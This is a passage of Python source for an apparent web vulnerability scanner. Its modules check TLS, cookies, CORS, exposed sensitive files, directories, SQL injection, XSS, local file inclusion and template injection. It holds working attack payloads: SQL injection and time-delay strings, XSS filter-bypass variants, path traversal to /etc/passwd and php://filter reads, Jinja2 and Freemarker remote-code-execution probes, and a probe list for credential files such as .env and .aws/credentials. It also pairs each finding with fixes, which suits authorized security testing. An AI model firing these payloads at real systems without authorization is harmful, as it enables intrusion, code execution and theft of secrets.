            vuln(f"TLS 1.0 in use — deprecated and vulnerable (BEAST, POODLE)", "High")
            add("ssl", {"severity": "High",
                "title": "TLS 1.0 Deprecated Protocol In Use",
                "description": "TLS 1.0 is deprecated (RFC 8996) and vulnerable to BEAST and POODLE attacks. PCI DSS compliance requires disabling TLS 1.0.",
                "recommendation": "Disable TLS 1.0 and 1.1. Enable TLS 1.2 and TLS 1.3 only.\nNginx: ssl_protocols TLSv1.2 TLSv1.3;\nApache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1\nTest: openssl s_client -connect target.com:443 -tls1 (should fail)"})
        elif proto in ("TLSv1.1",):
            vuln(f"TLS 1.1 in use — deprecated", "Medium")
            add("ssl", {"severity": "Medium",
                "title": "TLS 1.1 Deprecated Protocol In Use",
                "description": "TLS 1.1 is deprecated (RFC 8996). While less vulnerable than TLS 1.0, it should be disabled in favour of TLS 1.2/1.3.",
                "recommendation": "Disable TLS 1.1. Configure server to use TLS 1.2 and TLS 1.3."})
        elif proto in ("TLSv1.2", "TLSv1.3"):
            good(f"Protocol: {proto} (acceptable)")

        # Weak cipher detection (v9.0)
        if cipher:
            cipher_name = cipher[0] if isinstance(cipher, tuple) else str(cipher)
            weak_ciphers = ["RC4","DES","3DES","MD5","NULL","EXPORT","anon","ADH","AECDH","RC2"]
            if any(w.lower() in cipher_name.lower() for w in weak_ciphers):
                vuln(f"Weak cipher in use: {cipher_name}", "High")
                add("ssl", {"severity": "High",
                    "title": f"Weak Cipher Suite: {cipher_name}",
                    "description": f"The negotiated cipher suite '{cipher_name}' is considered weak and may be vulnerable to cryptographic attacks.",
                    "recommendation": "Configure server to use only strong cipher suites.\nNginx: ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;\nssl_prefer_server_ciphers off;\nApache: SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384\nDisable: RC4, DES, 3DES, MD5-based, EXPORT ciphers."})
            else:
                good(f"Cipher: {cipher_name} (acceptable)")

    except ssl.SSLError as e:
        vuln(f"SSL error: {e}", "High")
        add("ssl", {"severity": "High",
            "title": "SSL/TLS Error",
            "description": f"SSL handshake failed: {e}",
            "recommendation": "Review server SSL configuration. Ensure a valid certificate is installed."})
    except Exception as e:
        err(f"SSL check: {e}")

    # Check if HTTP also accessible (mixed scheme)
    http_url = url.replace("https://", "http://", 1)
    try:
        r = rget(http_url, allow_redirects=False, timeout=5)
        if r.status_code not in (301, 302, 307, 308):
            vuln("HTTP accessible without redirect to HTTPS", "Medium")
            add("ssl", {"severity": "Medium",
                "title": "HTTP Not Redirected to HTTPS",
                "description": "The site is accessible via plain HTTP without being redirected to HTTPS. Users who type the URL without 'https://' will use an insecure connection.",
                "recommendation": "Add a 301 redirect from all HTTP to HTTPS.\nNginx:\n  server { listen 80; server_name _; return 301 https://$host$request_uri; }\nApache: Redirect permanent / https://yourdomain.com/  (or use RewriteRule)\nThen add HSTS: Nginx: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\nApache: Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\""})
        else:
            good("HTTP properly redirects to HTTPS")
    except Exception:
        pass
    _module_done("ssl")

# ═══ MODULE 8 — COOKIE SECURITY ══════════════════════════════════
def check_cookies(url):
    if _module_skip("cookies"): info("Skipping cookies (already done)"); return
    section("MODULE 8 — COOKIE SECURITY","🍪")
    try:
        r = rget(url)
        cookies = r.cookies
        if not cookies:
            info("No cookies set by server")
            _module_done("cookies"); return
        for c in cookies:
            issues = []
            if not c.secure:
                issues.append(("Secure flag missing", "Medium",
                    "Cookie can be transmitted over unencrypted HTTP connections, making it vulnerable to interception."))
            if not c.has_nonstandard_attr("HttpOnly"):
                issues.append(("HttpOnly flag missing", "Medium",
                    "Cookie is accessible via JavaScript, making it vulnerable to XSS-based session hijacking."))
            samesite = c.has_nonstandard_attr("SameSite") or c.has_nonstandard_attr("samesite")
            if not samesite:
                issues.append(("SameSite attribute missing", "Low",
                    "Without SameSite, the cookie may be sent with cross-site requests, enabling CSRF attacks."))
            if issues:
                for issue_title, sev, desc in issues:
                    vuln(f"Cookie '{c.name}': {issue_title}", sev)
                    add("cookies", {"cookie": c.name, "severity": sev,
                        "title": f"Cookie '{c.name}': {issue_title}",
                        "description": desc,
                        "recommendation": f"Set the {issue_title.split()[0]} attribute on cookie '{c.name}'."})
            else:
                good(f"Cookie '{c.name}': all security flags set")
    except Exception as e:
        err(f"Cookie check: {e}")
    _module_done("cookies")

# ═══ MODULE 9 — CORS CHECK (v9.0: null origin, subdomain wildcard, pre-flight) ═
def check_cors(url):
    if _module_skip("cors"): info("Skipping CORS (already done)"); return
    section("MODULE 9 — CORS MISCONFIGURATION","🌍")
    parsed = urlparse(url)
    base_domain = parsed.netloc

    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",                                              # v9.0: null origin
        f"https://evil.{base_domain}",                      # v9.0: subdomain of target
        f"https://{base_domain}.attacker.com",              # v9.0: target as prefix
        "https://www.google.com",
    ]

    found_issues = False
    for origin in test_origins:
        try:
            r = rget(url, headers={"Origin": origin})
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","")

            if acao == "*" and acac.lower() == "true":
                vuln(f"CORS: wildcard + credentials — critical misconfiguration", "Critical")
                add("cors", {"origin_tested": origin, "severity": "Critical",
                    "title": "CORS: Wildcard Origin With Credentials",
                    "description": "The server returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. This allows any website to make authenticated requests on behalf of the user.",
                    "recommendation": "Never use Access-Control-Allow-Origin: * with credentials.\nNginx fix: map $http_origin $cors_origin { default \"\"; \"https://trusted.com\" $http_origin; }\n          add_header Access-Control-Allow-Origin $cors_origin always;\nApache fix: SetEnvIf Origin \"^https://trusted\\.com$\" CORS_ALLOW=1\n           Header always set Access-Control-Allow-Origin \"https://trusted.com\" env=CORS_ALLOW"})
                found_issues = True
            elif acao == origin or acao == "*":
                sev = "High" if acac.lower() == "true" else "Medium"
                vuln(f"CORS reflects origin '{origin[:40]}' (Credentials: {acac})", sev)
                add("cors", {"origin_tested": origin, "severity": sev,
                    "title": f"CORS Origin Reflected: {origin[:60]}",
                    "description": f"Server reflects the Origin header value '{origin}' in ACAO without validation. {'With credentials=true, this allows cross-origin authenticated requests.' if acac.lower()=='true' else 'Sensitive data may be accessible cross-origin.'}",
                    "recommendation": "Validate Origin header server-side before reflecting it.\nNever reflect request Origin blindly — check against an allowed list first.\nExample whitelist check (Nginx map block):\nmap $http_origin $allowed_origin {\n  default \"\";\n  \"https://app.example.com\" $http_origin;\n  \"https://admin.example.com\" $http_origin; }\nadd_header Access-Control-Allow-Origin $allowed_origin always;"})
                found_issues = True
        except Exception:
            pass

    # v9.0: Pre-flight CORS test
    try:
        pf_resp = _sess.options(url, timeout=TIMEOUT, verify=False, headers={
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "content-type,authorization"
        })
        acam = pf_resp.headers.get("Access-Control-Allow-Methods","")
        acah = pf_resp.headers.get("Access-Control-Allow-Headers","")
        if acam and "authorization" in acah.lower():
            vuln(f"CORS pre-flight allows cross-origin Authorization header", "High")
            add("cors", {"origin_tested": "pre-flight", "severity": "High",
                "title": "CORS Pre-flight Allows Authorization Header Cross-Origin",
                "description": f"Pre-flight response allows Methods: {acam}, Headers: {acah}. Allowing 'authorization' header cross-origin enables credential theft.",
                "recommendation": "Restrict allowed headers in CORS pre-flight to only those necessary. Never allow 'authorization' from untrusted origins."})
            found_issues = True
    except Exception:
        pass

    if not found_issues:
        good("No CORS misconfiguration detected")
    _module_done("cors")

# ═══ MODULE 10 — SENSITIVE FILES (v9.0: 150+ paths + keyword detection) ═
SENSITIVE_PATHS = [
    # Git/Version control
    "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG", "/.git/index",
    "/.git/logs/HEAD", "/.gitignore", "/.gitmodules", "/.svn/entries",
    "/.svn/wc.db", "/.hg/hgrc",
    # Environment / Config
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.env.backup", "/.env.example", "/.env.old", "/.env.staging",
    "/config.php", "/config.php.bak", "/config.php.old", "/config.inc.php",
    "/configuration.php", "/config.yml", "/config.yaml", "/config.json",
    "/app/config/database.yml", "/config/database.yml",
    "/config/secrets.yml", "/config/credentials.yml",
    "/settings.py", "/local_settings.py", "/app_settings.py",
    "/web.config", "/web.config.bak", "/app.config",
    # Backup files
    "/backup.sql", "/backup.zip", "/backup.tar.gz", "/backup.tar",
    "/database.sql", "/db.sql", "/dump.sql", "/mysql.sql",
    "/site.tar.gz", "/www.tar.gz", "/htdocs.zip", "/html.zip",
    "/backup/", "/backups/", "/bak/", "/old/",
    # Admin / CMS
    "/admin/", "/admin/login", "/admin/index.php", "/administrator/",
    "/wp-admin/", "/wp-login.php", "/wp-config.php", "/wp-config.php.bak",
    "/wordpress/wp-config.php", "/cms/", "/panel/", "/cpanel/",
    "/phpmyadmin/", "/pma/", "/mysql/", "/adminer/", "/adminer.php",
    # Logs
    "/error.log", "/error_log", "/access.log", "/access_log",
    "/logs/error.log", "/logs/access.log", "/var/log/apache2/error.log",
    "/debug.log", "/laravel.log", "/storage/logs/laravel.log",
    "/app/storage/logs/laravel.log", "/log/", "/logs/",
    # System files (accessible via web)
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "/proc/version",
    # API Keys / Credentials
    "/api/", "/api/v1/", "/api/v2/", "/api/swagger.json",
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
    "/api-docs", "/api-docs.json", "/graphql",
    # Docker / Cloud
    "/.dockerenv", "/docker-compose.yml", "/docker-compose.yaml",
    "/Dockerfile", "/.aws/credentials", "/.aws/config",
    "/secrets/", "/secret/", "/credentials/",
    # Node.js
    "/package.json", "/package-lock.json", "/yarn.lock",
    "/node_modules/.package-lock.json", "/.npmrc",
    # Ruby
    "/Gemfile", "/Gemfile.lock", "/.bundle/config",
    # Python
    "/requirements.txt", "/Pipfile", "/Pipfile.lock",
    "/setup.py", "/setup.cfg", "/.python-version",
    # PHP specific
    "/info.php", "/phpinfo.php", "/test.php", "/php.ini",
    "/composer.json", "/composer.lock",
    # CI/CD
    "/.travis.yml", "/.circleci/config.yml", "/.github/workflows/",
    "/Jenkinsfile", "/.gitlab-ci.yml", "/.bitbucket-pipelines.yml",
    # Misc sensitive
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/.htpasswd",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/security.txt", "/.well-known/security.txt",
    "/CHANGELOG", "/CHANGELOG.md", "/CHANGELOG.txt",
    "/README", "/README.md", "/VERSION", "/INSTALL",
    "/server-status", "/server-info", "/.DS_Store",
    "/thumbs.db", "/desktop.ini",
    # Tomcat / Java
    "/manager/html", "/host-manager/html", "/web-inf/web.xml",
    "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
    # IIS
    "/iisstart.htm", "/iis-85.png",
    # Jenkins
    "/jenkins/", "/job/", "/script",
    # Spring Boot
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/mappings", "/actuator/beans", "/actuator/info",
    "/actuator/metrics", "/actuator/logfile", "/actuator/dump",
    # Kubernetes
    "/metrics", "/healthz", "/readyz", "/livez",
]

# Keywords that indicate sensitive content in a 200 response
SENSITIVE_KEYWORDS = [
    "password","passwd","secret","token","api_key","apikey","auth_token",
    "private_key","aws_access_key","aws_secret","database_url","db_password",
    "db_host","connection_string","credentials","BEGIN RSA PRIVATE KEY",
    "BEGIN OPENSSH PRIVATE KEY","-----BEGIN","DB_PASS","DB_USER","MYSQL_ROOT_PASSWORD",
    "SECRET_KEY","DJANGO_SECRET","JWT_SECRET","APP_KEY","ENCRYPTION_KEY",
]

def check_sensitive(url):
    if _module_skip("sensitive"): info("Skipping sensitive files (already done)"); return
    section("MODULE 10 — SENSITIVE FILES & DIRECTORIES","📁")
    info(f"Checking {len(SENSITIVE_PATHS)} sensitive paths (v9.0: keyword body detection)...")
    base = url.rstrip("/")
    found_count = 0

    def _check_path(path):
        target = base + path
        try:
            r = rget(target, allow_redirects=False, timeout=TIMEOUT)
            if r.status_code in (200, 206):
                size = len(r.content)
                if size < 10: return None  # Skip empty responses
                # Keyword detection in body
                body_low = r.text[:5000].lower()
                found_kw = [kw for kw in SENSITIVE_KEYWORDS if kw.lower() in body_low]
                return (path, r.status_code, size, found_kw)
            elif r.status_code in (301, 302):
                # Directory redirect — worth noting
                if path.endswith("/"):
                    return (path, r.status_code, 0, [])
        except Exception:
            pass
        return None

    total = len(SENSITIVE_PATHS); done = 0
    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = {ex.submit(_check_path, p): p for p in SENSITIVE_PATHS}
        for f in as_completed(futs):
            done += 1; progress(done, total, futs[f])
            res = f.result()
            if res:
                path, status, size, kws = res
                sev = "Critical" if kws else ("High" if any(x in path for x in [
                    ".env","config","passwd","shadow","credentials",".git","wp-config",
                    "actuator/env","actuator/dump","actuator/logfile"]) else "Medium")
                kw_note = f" ⚠ SECRETS FOUND: {', '.join(kws[:5])}" if kws else ""
                vuln(f"[{status}] {path} ({size}B){kw_note}", sev)
                add("sensitive", {"path": path, "status": status, "size": size,
                    "keywords_found": kws, "severity": sev,
                    "title": f"Sensitive File Accessible: {path}",
                    "description": f"HTTP {status} response for {path} ({size} bytes).{(' Contains sensitive keywords: ' + ', '.join(kws[:5])) if kws else ''}",
                    "recommendation": "Remove or restrict access to this file. Add 'deny from all' in .htaccess or equivalent in nginx/Apache config."})
                found_count += 1
    sys.stdout.write("\n")
    if found_count == 0:
        good("No accessible sensitive files found")
    else:
        warn(f"Found {found_count} accessible sensitive file(s)")
    _module_done("sensitive")

# ═══ MODULE 11 — DIRECTORY BRUTEFORCE (v9.0: extension fuzzing) ════
def dir_bruteforce(url, wordlist=None):
    if _module_skip("dirs"): info("Skipping directory brute-force (already done)"); return []
    section("MODULE 11 — DIRECTORY BRUTEFORCE","📂")

    # v9.0: Extension fuzzing list
    EXTENSIONS = ["", ".php", ".bak", ".old", ".txt", ".zip", ".tar.gz",
                  ".sql", ".log", ".conf", ".cfg", ".xml", ".json", ".asp", ".aspx"]

    words = []
    if wordlist and os.path.exists(wordlist):
        try:
            with open(wordlist) as f:
                words = [l.strip() for l in f if l.strip()]
        except Exception: pass

    if not words:
        words = [
            "admin","login","dashboard","panel","api","backup","config","test",
            "dev","staging","static","assets","images","uploads","files","media",
            "includes","css","js","lib","vendor","src","app","wp-admin","phpmyadmin",
            "mysql","database","db","sql","logs","log","tmp","temp","cache",
            "docs","documentation","help","support","about","contact","home",
            "index","default","main","portal","user","users","register","signup",
            "forgot","reset","account","profile","settings","preferences",
            "search","sitemap","robots","cgi-bin","cgi","scripts","bin",
            "tools","utilities","components","modules","plugins","themes",
            "setup","install","update","upgrade","migration","deploy",
        ]

    base = url.rstrip("/")
    found = []
    info(f"Fuzzing {len(words)} words × {len(EXTENSIONS)} extensions = {len(words)*len(EXTENSIONS)} probes...")

    def _check(word, ext):
        target = f"{base}/{word}{ext}"
        try:
            r = rget(target, allow_redirects=False, timeout=6)
            if r.status_code in (200, 204, 301, 302, 403):
                return (target, r.status_code, len(r.content), word, ext)
        except Exception:
            pass
        return None

    total = len(words) * len(EXTENSIONS); done = 0
    with ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(_check, w, e): (w, e) for w in words for e in EXTENSIONS}
        for f in as_completed(futs):
            done += 1
            if done % 50 == 0: progress(done, total, futs[f][0])
            res = f.result()
            if res:
                target, code, size, word, ext = res
                sev = "High" if code == 200 else ("Medium" if code == 403 else "Low")
                # Bump severity for backup extensions
                if ext in (".bak",".old",".sql",".zip",".tar.gz",".log",".conf") and code == 200:
                    sev = "Critical"
                note = f"[{code}] {target} ({size}B)"
                if sev in ("Critical","High"): vuln(note, sev)
                else: info(note)
                item = {"url": target, "status": code, "size": size,
                        "extension": ext, "severity": sev,
                        "title": f"Directory/File Found: {word}{ext} [{code}]",
                        "description": f"HTTP {code} at {target} ({size} bytes). {'Backup file accessible — may contain credentials or source code.' if ext in ('.bak','.old','.sql') else ''}",
                        "recommendation": "Review access controls. Remove backup files from web root. Return 404 instead of 403 for sensitive paths."}
                found.append(item)
                add("dirs", item)
    sys.stdout.write("\n")
    good(f"Found {len(found)} path(s)") if found else info("No directories/files found")
    _module_done("dirs")
    return found

# ═══ MODULE 12 — SQL INJECTION (parallel payload testing) ════════
def sqli_scan(url):
    if _module_skip("sqli"): info("Skipping SQLi (already done)"); return
    section("MODULE 12 — SQL INJECTION","💉")

    DB_ERRORS = {
        "MySQL":      ["you have an error in your sql syntax","mysql_fetch","mysql_num_rows",
                       "warning: mysql","1064 you have","supplied argument is not"],
        "PostgreSQL": ["pg_query()","pg_exec()","syntax error at or near",
                       "unterminated quoted string","pg_fetch_assoc"],
        "MSSQL":      ["microsoft sql server","odbc sql server","unclosed quotation mark",
                       "incorrect syntax near","conversion failed"],
        "Oracle":     ["ora-01756","ora-00907","ora-00933","oracle error",
                       "quoted string not properly terminated"],
        "SQLite":     ["sqlite_","sqlite3_","sql logic error","unrecognized token"],
        "Generic":    ["sql error","database error","query failed","sql syntax"],
    }

    # Focused payload set — top error-based + union + blind (3s timeout for time-based)
    SQLI_PAYLOADS = [
        ("'",                               "error"),
        ("\"",                              "error"),
        ("' OR '1'='1'--",                  "error"),
        ("' OR 1=1--",                      "error"),
        ("1' ORDER BY 100--",               "error"),
        ("' UNION SELECT NULL,NULL--",      "error"),
        ("' UNION SELECT @@version,NULL--", "error"),
        ('{"$gt":""}',                      "error"),
        ("'; SELECT SLEEP(3)--",            "time"),
        ("'; WAITFOR DELAY '0:0:3'--",      "time"),
    ]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        info("No GET parameters found — trying common test parameters")
        params = {"id": ["1"], "page": ["1"], "search": ["test"], "cat": ["1"]}

    _found = threading.Event()

    # v11.5: Measure baseline BEFORE any injection to prevent false positives on slow servers
    _sqli_baseline = [3.0]  # default fallback baseline
    try:
        _t0 = time.time()
        _rb = rget(url if not parsed.query else parsed._replace(query=urlencode(dict(params), doseq=True)).geturl(), timeout=TIMEOUT)
        _sqli_baseline[0] = time.time() - _t0
        info(f"SQLi baseline response time: {_sqli_baseline[0]:.2f}s")
    except Exception:
        pass

    def _test(param, payload, ptype):
        if _found.is_set(): return
        tp = dict(params); tp[param] = [payload]
        test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
        try:
            if ptype == "time":
                # Time-based: use baseline + margin; require delay > baseline + 2.5s
                t_out = max(TIMEOUT, _sqli_baseline[0] + 7)
                t0 = time.time()
                r = rget(test_url, timeout=t_out)
                actual_delay = time.time() - t0
                delay_above_baseline = actual_delay - _sqli_baseline[0]
                body_low = r.text.lower()
                if delay_above_baseline > 2.5:
                    _found.set()
                    vuln(f"Blind SQLi (time-based CONFIRMED) param='{param}' baseline={_sqli_baseline[0]:.1f}s delay={actual_delay:.1f}s (+{delay_above_baseline:.1f}s)", "Critical")
                    add("sqli", {"param": param, "payload": payload, "db_type": "Blind/Time-based",
                        "confirmed": True, "severity": "Critical",
                        "title": f"Blind SQL Injection (Time-based CONFIRMED) [{param}]",
                        "description": f"CONFIRMED: Response delayed {actual_delay:.1f}s vs baseline {_sqli_baseline[0]:.1f}s (+{delay_above_baseline:.1f}s above baseline). Param: '{param}'. Payload: {payload[:100]}",
                        "recommendation": "Use parameterized queries. Apply input validation and WAF rules.",
                        "evidence": f"Baseline: {_sqli_baseline[0]:.2f}s | Injected: {actual_delay:.2f}s | Delta: +{delay_above_baseline:.2f}s"})
            else:
                r = rget(test_url, timeout=TIMEOUT)
                body_low = r.text.lower()
                for db_type, sigs in DB_ERRORS.items():
                    for sig in sigs:
                        if sig in body_low:
                            _found.set()
                            vuln(f"SQLi [{db_type}] CONFIRMED param='{param}' payload='{payload[:30]}'", "Critical")
                            add("sqli", {"param": param, "payload": payload, "db_type": db_type,
                                "confirmed": True, "severity": "Critical",
                                "title": f"SQL Injection — {db_type} Error CONFIRMED [{param}]",
                                "description": f"CONFIRMED: DB error '{sig}' in response. Param: '{param}'. Payload: {payload[:100]}",
                                "recommendation": "Use parameterized queries. Never concatenate user input into SQL.",
                                "evidence": f"Error signature '{sig}' found in HTTP response body"})
                            return
        except Exception:
            pass

    tasks = [(p, pl, pt) for p in list(params.keys())[:6] for pl, pt in SQLI_PAYLOADS]
    with ThreadPoolExecutor(max_workers=min(len(tasks), 20)) as ex:
        futs = [ex.submit(_test, p, pl, pt) for p, pl, pt in tasks]
        for f in as_completed(futs): _pass(f)

    if not _found.is_set():
        good("No SQL injection detected on tested parameters")
    _module_done("sqli")

# ═══ MODULE 13 — XSS (parallel payload testing) ══════════════════
def xss_scan(url):
    if _module_skip("xss"): info("Skipping XSS (already done)"); return
    section("MODULE 13 — CROSS-SITE SCRIPTING (XSS)","🧨")

    # Top WAF-bypass XSS payloads — most effective, all contexts covered
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "'\"><img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "\" onmouseover=alert(1) \"",
        "javascript:alert(1)",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<Img SrC=x OnErRoR=alert(1)>",
    ]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        params = {"q": ["test"], "search": ["test"], "name": ["test"]}

    _found_xss = threading.Event()

    def _test_xss(param, payload):
        if _found_xss.is_set(): return
        tp = dict(params); tp[param] = [payload]
        test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
        try:
            r = rget(test_url, timeout=TIMEOUT)
            body = r.text
            # v11.5: Context verification — check payload is ACTUALLY reflected unescaped
            # HTML-encoded versions like &lt;script&gt; are NOT exploitable
            if payload in body:
                # Exact match — payload reflected verbatim (confirmed)
                _found_xss.set()
                vuln(f"Reflected XSS CONFIRMED param='{param}' payload='{payload[:50]}'", "High")
                add("xss", {"param": param, "payload": payload, "severity": "High",
                    "confirmed": True,
                    "title": f"Reflected XSS CONFIRMED — Parameter '{param}'",
                    "description": f"CONFIRMED: XSS payload reflected verbatim (unencoded) in HTTP response. Param: '{param}'. Payload: {payload[:100]}",
                    "recommendation": "HTML-encode all user input before rendering. Implement strict Content-Security-Policy.",
                    "evidence": f"Payload '{payload[:60]}' found verbatim in response body"})
            elif payload.lower() in body.lower():
                # Case-insensitive match — check for HTML encoding
                encoded = payload.replace("<","&lt;").replace(">","&gt;").replace('"','&quot;').replace("'","&#x27;")
                if encoded.lower() not in body.lower():
                    # Not encoded → still reflected but case-modified
                    _found_xss.set()
                    vuln(f"Reflected XSS (case-insensitive) CONFIRMED param='{param}'", "High")
                    add("xss", {"param": param, "payload": payload, "severity": "High",
                        "confirmed": True,
                        "title": f"Reflected XSS CONFIRMED (case-modified) — Parameter '{param}'",
                        "description": f"CONFIRMED: XSS payload reflected case-modified but unencoded. Param: '{param}'. Payload: {payload[:100]}",
                        "recommendation": "HTML-encode all user input before rendering. Implement Content-Security-Policy.",
                        "evidence": f"Case-modified payload found unencoded in response"})
        except Exception:
            pass

    tasks = [(p, pl) for p in list(params.keys())[:6] for pl in XSS_PAYLOADS]
    with ThreadPoolExecutor(max_workers=min(len(tasks), 20)) as ex:
        futs = [ex.submit(_test_xss, p, pl) for p, pl in tasks]
        for f in as_completed(futs): _pass(f)

    if not _found_xss.is_set():
        good("No reflected XSS detected on tested parameters")
    _module_done("xss")

# ═══ MODULE 14 — LFI (parallel: Linux + Windows + PHP wrappers) ══
def lfi_scan(url):
    if _module_skip("lfi"): info("Skipping LFI (already done)"); return
    section("MODULE 14 — LOCAL FILE INCLUSION (LFI)","📂")

    # Top payloads covering Linux, Windows, PHP wrappers, encoding
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252Fetc%252Fpasswd",
        "....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
    ]

    LFI_CONFIRM = ["root:x:","root:0:","[boot loader]","[fonts]","localhost",
                   "127.0.0.1","linux version","processor","etc/shadow",
                   "www-data","daemon:x:"]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    lfi_params = ["file","page","include","path","doc","load","template",
                  "view","content","module","lang","dir","folder"]
    test_params = dict(params)
    for lp in lfi_params:
        if lp not in test_params:
            test_params[lp] = ["index"]

    _found_lfi = threading.Event()

    def _test_lfi(param, payload):
        if _found_lfi.is_set(): return
        tp = dict(test_params); tp[param] = [payload]
        test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
        try:
            r = rget(test_url, timeout=TIMEOUT)
            body_low = r.text.lower()[:5000]
            if "base64" in payload:
                b64_match = re.search(r'[A-Za-z0-9+/]{100,}={0,2}', r.text)
                if b64_match:
                    try:
                        dec = _b64.b64decode(b64_match.group()).decode("utf-8", errors="replace")
                        if any(s in dec.lower() for s in ["<?php","root:","password","db_"]):
                            _found_lfi.set()
                            vuln(f"LFI PHP wrapper param='{param}' — source code exposed", "Critical")
                            add("lfi", {"param": param, "payload": payload,
                                "severity": "Critical",
                                "title": f"LFI via PHP Filter Wrapper — Source Code Exposed [{param}]",
                                "description": "php://filter wrapper returned base64-encoded file contents with PHP source code or credentials.",
                                "recommendation": "Disable allow_url_include. Whitelist allowed file paths. Never pass user input to include/require."})
                            return
                    except Exception: pass
            for sig in LFI_CONFIRM:
                if sig in body_low:
                    _found_lfi.set()
                    vuln(f"LFI confirmed param='{param}' sig='{sig}' payload='{payload[:40]}'", "Critical")
                    add("lfi", {"param": param, "payload": payload,
                        "severity": "Critical",
                        "title": f"Local File Inclusion Confirmed [{param}]",
                        "description": f"Signature '{sig}' found. Param: '{param}'. Payload: '{payload[:100]}'",
                        "recommendation": "Disable allow_url_include/allow_url_fopen. Whitelist allowed file paths. Never pass user input to include/require/fopen."})
                    return
        except Exception: pass

    tasks = [(p, pl) for p in list(test_params.keys())[:5] for pl in LFI_PAYLOADS]
    with ThreadPoolExecutor(max_workers=min(len(tasks), 20)) as ex:
        futs = [ex.submit(_test_lfi, p, pl) for p, pl in tasks]
        for f in as_completed(futs): _pass(f)

    if not _found_lfi.is_set():
        good("No LFI detected on tested parameters")
    _module_done("lfi")

# ═══ MODULE 15 — SSTI (8 engines, enhanced probes) ════════════════
def ssti_scan(url):
    if _module_skip("ssti"): info("Skipping SSTI (already done)"); return
    section("MODULE 15 — SERVER-SIDE TEMPLATE INJECTION","🧪")

    # Probe → expected output mapping per engine
    SSTI_PROBES = [
        # Jinja2 / Twig / Pebble / Latte: {{7*7}} → 49
        ("{{7*7}}",          "49",   "Jinja2/Twig/Pebble"),
        ("{{7*'7'}}",        "7777777", "Jinja2"),
        # Freemarker: ${7*7} → 49
        ("${7*7}",           "49",   "Freemarker"),
        ("#{7*7}",           "49",   "Freemarker/Spring EL"),
        # Ruby ERB: <%= 7*7 %> → 49
        ("<%= 7*7 %>",       "49",   "Ruby ERB"),
        # Smarty: {7*7} → 49
        ("{7*7}",            "49",   "Smarty"),
        # Mako: ${7*7} → 49
        ("${7*7}",           "49",   "Mako"),
        # Razor (ASP.NET): @(7*7) → 49
        ("@(7*7)",           "49",   "Razor"),
        # Velocity: #set($x=7*7)$x → 49
        ("#set($x=7*7)$x",  "49",   "Velocity"),
        # Tornado: {{7*7}} → 49
        ("{{7*7}}",          "49",   "Tornado"),
        # Expression Language
        ("${7*7}",           "49",   "Spring EL/EL Injection"),
        # Pebble
        ("{{7 * 7}}",        "49",   "Pebble"),
        # Advanced Jinja2 RCE probe
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
         "uid=", "Jinja2 RCE"),
        # Freemarker RCE
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
         "uid=", "Freemarker RCE"),
    ]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    ssti_params = ["name","template","msg","message","content","data","input","text","q","search"]
    test_params = dict(params)
    for sp in ssti_params:
        if sp not in test_params:
            test_params[sp] = ["hello"]

    found_ssti = False
    for param in list(test_params.keys())[:6]:
        for payload, expected, engine in SSTI_PROBES:
            tp = dict(test_params)
            tp[param] = [payload]
            test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
            try:
                r = rget(test_url, timeout=TIMEOUT)
                if expected in r.text:
                    sev = "Critical" if "RCE" in engine else "High"
                    vuln(f"SSTI [{engine}] param='{param}' expected='{expected}'", sev)
                    add("ssti", {"param": param, "payload": payload, "engine": engine,
                        "severity": sev,
                        "title": f"SSTI Detected [{engine}] — Parameter '{param}'",
                        "description": f"Template injection confirmed in engine {engine}. Output '{expected}' found in response. This can lead to remote code execution.",
                        "recommendation": "Never pass user input to template rendering functions. Use sandboxed templates. Upgrade to a framework version with safe template handling."})
                    found_ssti = True
            except Exception:
                pass
    if not found_ssti:
